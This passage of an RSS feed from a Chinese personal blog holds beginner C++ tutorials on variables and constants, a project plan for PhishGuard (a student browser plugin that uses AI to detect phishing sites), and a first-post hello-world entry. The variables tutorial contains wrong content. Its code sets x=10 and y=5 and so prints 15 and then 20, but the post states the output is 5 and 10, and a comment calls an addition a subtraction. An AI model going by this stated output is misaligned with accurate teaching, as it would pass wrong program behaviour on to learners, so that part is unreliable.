start="2"><li>同时，变量也存在数学运算 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> x,y,num;    <span class="comment">//创建 x,y,num 三个变量</span></span><br><span class="line">    x = <span class="number">10</span>;     <span class="comment">//对 x 赋值</span></span><br><span class="line">    y = <span class="number">5</span>;      <span class="comment">//对 y 赋值</span></span><br><span class="line">    num = x + y;    <span class="comment">//将 num 赋值为 x+y</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;num =&quot;</span> &lt;&lt; num &lt;&lt; endl; <span class="comment">//输出1</span></span><br><span class="line">    num = num + <span class="number">5</span>;   <span class="comment">//对 num 本身做减法</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;num =&quot;</span> &lt;&lt; num &lt;&lt; endl; <span class="comment">//输出2</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> 此时返回的值是 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">num = <span class="number">5</span>     <span class="comment">//输出1</span></span><br><span class="line">num = <span class="number">10</span>    <span class="comment">//输出2</span></span><br></pre></td></tr></table></figure> 这样我们可以看到：<ul><li>变量的赋值是可以通过变量和变量的运算得出的</li><li>变量的赋值是可以通过这个变量本身和常熟四则运算得出的</li></ul></li></ol>]]></content:encoded>
      
      
      <category domain="https://baiyb.top/categories/C/">C++</category>
      
      
      <category domain="https://baiyb.top/tags/C/">C++</category>
      
      <category domain="https://baiyb.top/tags/%E5%8F%98%E9%87%8F/">变量</category>
      
      
      <comments>https://baiyb.top/2025/03/13/CPP-%E5%8F%98%E9%87%8F/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>C++ 常量</title>
      <link>https://baiyb.top/2025/03/13/CPP-%E5%B8%B8%E9%87%8F/</link>
      <guid>https://baiyb.top/2025/03/13/CPP-%E5%B8%B8%E9%87%8F/</guid>
      <pubDate>Thu, 13 Mar 2025 05:24:52 GMT</pubDate>
      
      <description>对于常量的学习分享</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h1><p>常量-在程序执行过程中不会改变的量 </p><h2 id="字面常量"><a href="#字面常量" class="headerlink" title="字面常量"></a>字面常量</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//以下都是字面常量</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="number">21</span>;             <span class="comment">//整型：整数，不带小数点的数字</span></span><br><span class="line">    <span class="number">3.14</span>;           <span class="comment">//实型：小数，带小数点的数字</span></span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>;            <span class="comment">//字符型：单引号&#x27;&#x27;引起来的单个字符</span></span><br><span class="line">    <span class="string">&quot;hello world&quot;</span>;  <span class="comment">//字符串：双引号&quot;&quot;引起来的任意个字符</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="符号常量"><a href="#符号常量" class="headerlink" title="符号常量"></a>符号常量</h2><p>符号常量：使用标识符去定义的常量</p><blockquote><p>简单来说就是：<strong>给常量起个名字</strong>  </p></blockquote><p>定义语法  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> 标识符(名称) 常量</span></span><br></pre></td></tr></table></figure><blockquote><p>#define —— 宏命令<br>标识符(名称) —— 是宏命令的参数，字母建议全大写<br>常量 —— 常量值  </p></blockquote><p>例如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> FAT_MBI 28      <span class="comment">//肥胖MBI</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> J2C_RATE 4.19   <span class="comment">//焦耳到卡路里比率</span></span></span><br></pre></td></tr></table></figure><blockquote><p>在重复使用的时候，难免会出现赋值错误的情况，但是在使用符号常量时，编译器会将符号常量自动替换为常量值，所以不会出现赋值错误的情况。</p></blockquote><p>下面是一个完整的示例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> x 10      <span class="comment">//长方形的长</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> y 5       <span class="comment">//长方形的宽</span></span></span><br><span class="line"><span class="comment">//符号常量写在程序的头部</span></span><br><span class="line"><span class="comment">//符号常量的定义末尾不需要分号;</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> S;</span><br><span class="line">    S=x*y;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;长方形的面积为：&quot;</span>&lt;&lt;S&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正确运行后应该返回</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">长方形的面积为：50</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="https://baiyb.top/categories/C/">C++</category>
      
      
      <category domain="https://baiyb.top/tags/C/">C++</category>
      
      <category domain="https://baiyb.top/tags/%E5%B8%B8%E9%87%8F/">常量</category>
      
      
      <comments>https://baiyb.top/2025/03/13/CPP-%E5%B8%B8%E9%87%8F/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>子非鱼-PhishGuard——基于AI的钓鱼网站检测插件</title>
      <link>https://baiyb.top/2025/03/12/PhishGuard%E2%80%94%E2%80%94%E5%9F%BA%E4%BA%8EAI%E7%9A%84%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E6%A3%80%E6%B5%8B%E6%8F%92%E4%BB%B6/</link>
      <guid>https://baiyb.top/2025/03/12/PhishGuard%E2%80%94%E2%80%94%E5%9F%BA%E4%BA%8EAI%E7%9A%84%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E6%A3%80%E6%B5%8B%E6%8F%92%E4%BB%B6/</guid>
      <pubDate>Wed, 12 Mar 2025 06:28:21 GMT</pubDate>
      
      <description>一个失败的大创（评分高达59.9），但是在讨论之后还是决定做下去，捎带手学习一下相关知识</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="怎么个事捏"><a href="#怎么个事捏" class="headerlink" title="怎么个事捏"></a>怎么个事捏</h1><p>一个失败的大创（评分高达59.9，与上榜失之交臂），但是在讨论之后还是决定做下去，捎带手学习一下相关知识</p><h1 id="我们的项目地址"><a href="#我们的项目地址" class="headerlink" title="我们的项目地址"></a>我们的项目地址</h1><p><a href="https://github.com/Bistu-OSSDT-2025/PhishGuard">https://github.com/Bistu-OSSDT-2025/PhishGuard</a></p><h1 id="开发思路"><a href="#开发思路" class="headerlink" title="开发思路"></a>开发思路</h1><img src="https://free.picui.cn/free/2025/07/03/6866683476b69.png" alt="开发思路" width="1000">  <br>  <h2 id="以下是刚做出规时考虑到的东西"><a href="#以下是刚做出规时考虑到的东西" class="headerlink" title="以下是刚做出规时考虑到的东西"></a>以下是刚做出规时考虑到的东西</h2><ul><li><p style="font-size: 20px;">想法：</p></li></ul><ol><li><strong>AI判断+黑白名单排除</strong><blockquote><p>对新网站进行自动化AI检测，检测过的网址则会被加入到黑白名单中，这样可以避免重复检测和误报，同时降低了AI的不必要算力需求</p></blockquote></li></ol><ul><li><p style="font-size: 20px;">问题：</p></li></ul><ol><li><strong>大模型不易本地部署</strong><blockquote><p>AI模型的大体量和对算力的要求都非常大，在本地部署会对电脑造成很大的负担，所以需要考虑如何轻量化模型，使其保证精确度的前提下降低对电脑的要求</p></blockquote></li></ol><br><h1 id="开发进度"><a href="#开发进度" class="headerlink" title="开发进度"></a>开发进度</h1><ul><li>准备工作<ul><li><input checked disabled type="checkbox"> 前期项目规划</li><li><input disabled type="checkbox"> 钓鱼网站数据收集</li></ul></li><li>前端开发<ul><li><input checked disabled type="checkbox"> 插件初步开发</li><li><input checked disabled type="checkbox"> 插件初步测试</li></ul></li><li>后端开发<ul><li><input checked disabled type="checkbox"> AI模型训练</li><li><input checked disabled type="checkbox"> 模型精度优化</li><li><input disabled type="checkbox"> 模型本地化部署</li></ul></li><li>前后端整合<ul><li><input disabled type="checkbox"> 插件集成AI模型</li><li><input disabled type="checkbox"> 插件二次测试</li></ul></li><li>测试与优化<ul><li><input disabled type="checkbox"> 插件三次测试</li><li><input disabled type="checkbox"> 性能优化</li></ul></li><li>文档撰写<ul><li><input checked disabled type="checkbox"> 项目报告</li><li><input checked disabled type="checkbox"> 技术文档</li></ul></li><li>发布与维护<ul><li><input checked disabled type="checkbox"> 发布插件</li><li><input disabled type="checkbox"> 维护与更新</li></ul></li></ul><h1 id="前端开发"><a href="#前端开发" class="headerlink" title="前端开发"></a>前端开发</h1>]]></content:encoded>
      
      
      <category domain="https://baiyb.top/categories/%E6%8A%80%E6%9C%AF%E7%B1%BB/">技术类</category>
      
      
      <category domain="https://baiyb.top/tags/%E6%8A%80%E6%9C%AF/">技术</category>
      
      <category domain="https://baiyb.top/tags/%E6%B2%B9%E7%8C%B4/">油猴</category>
      
      <category domain="https://baiyb.top/tags/%E6%8F%92%E4%BB%B6/">插件</category>
      
      <category domain="https://baiyb.top/tags/AI/">AI</category>
      
      
      <comments>https://baiyb.top/2025/03/12/PhishGuard%E2%80%94%E2%80%94%E5%9F%BA%E4%BA%8EAI%E7%9A%84%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E6%A3%80%E6%B5%8B%E6%8F%92%E4%BB%B6/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>运营博客第一天！</title>
      <link>https://baiyb.top/2025/03/11/%E8%BF%90%E8%90%A5%E5%8D%9A%E5%AE%A2%E7%AC%AC%E4%B8%80%E5%A4%A9%EF%BC%81/</link>
      <guid>https://baiyb.top/2025/03/11/%E8%BF%90%E8%90%A5%E5%8D%9A%E5%AE%A2%E7%AC%AC%E4%B8%80%E5%A4%A9%EF%BC%81/</guid>
      <pubDate>Tue, 11 Mar 2025 15:13:48 GMT</pubDate>
      
      <description>不容易啊终于建成了QAQ</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="运营博客第一天！"><a href="#运营博客第一天！" class="headerlink" title="运营博客第一天！"></a>运营博客第一天！</h2><p>超级不容易，从六点半奋战到九点半，终于是给 Hexo 装好了，顺手处理了个 GitHub 不解析我域名的小问题，还用了 Butterfly 的美化（当然还有很多没做的地方，甚至说没有美化（（（<br>不过好说歹说也算是搭起来了，以后可能会分享一些技术性内容和别的什么生活随笔吧！</p><h2 id="代码块测试"><a href="#代码块测试" class="headerlink" title="代码块测试"></a>代码块测试</h2><p>最后试试写个代码块，就来个最简单的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 代码块示例（C语言）</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello, Hexo!\n Hello,world!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Hello, Hexo! Hello, world!</p>]]></content:encoded>
      
      
      <category domain="https://baiyb.top/categories/Hello-World/">Hello World</category>
      
      
      <category domain="https://baiyb.top/tags/%E9%9A%8F%E7%AC%94/">随笔</category>
      
      
      <comments>https://baiyb.top/2025/03/11/%E8%BF%90%E8%90%A5%E5%8D%9A%E5%AE%A2%E7%AC%AC%E4%B8%80%E5%A4%A9%EF%BC%81/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
